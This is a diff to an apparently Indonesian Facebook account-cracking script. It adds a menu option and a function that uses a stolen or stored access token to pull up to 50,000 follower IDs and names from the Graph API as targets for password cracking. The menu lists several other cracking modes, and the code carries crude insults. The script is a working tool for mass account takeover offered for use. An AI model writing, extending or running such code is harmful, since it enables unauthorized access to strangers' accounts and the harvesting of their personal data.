@@ -3188,7 +3188,7 @@ def menu(my_name, my_id):
     console.print(Columns(dia))
     prints(
         Panel(
-            f"""{P2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack pencarian nama
+            f"""{P2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari id pengikut
 [{color_text}02{P2}]. crack dari id Masal    [{color_text}06{P2}]. Dump ID Publik
 [{color_text}03{P2}]. crack dari Postingan   [{color_text}07{P2}]. crack dari File
 [{color_text}04{P2}]. crack dari random mail [{color_text}08{P2}]. crack dari opsi CP""",
@@ -3215,7 +3215,7 @@ def menu(my_name, my_id):
     elif HaHi in ["4", "04"]:
         crack_email()
     elif HaHi in ["5", "05"]:
-        maintenance()
+        crack_foll()
     elif HaHi in ["6", "06"]:
         publikv2()
     elif HaHi in ["7", "07"]:
@@ -3230,7 +3230,21 @@ def menu(my_name, my_id):
         Lain(cookie).menu()
     else:
         console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
-
+def crack_foll():
+    pepek = open('.vipertok.txt','r').read()
+    try:
+        idt = console.input(f" {H2}• {P2}Masukan id : ")
+        r = requests.get(f"https://graph.facebook.com/{idt}/subscribers?limit=50000&access_token={pepek}")
+        z = json.loads(r.text)
+        for a in z['data']:
+            id.append(a["id"] + "|" + a["name"])
+    except KeyError:
+        print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt))
+        time.sleep(3)
+        exit()
+    else:
+        setting()
+        
 def crack_post():
     pepek = open('.vipertok.txt','r').read()
     try:
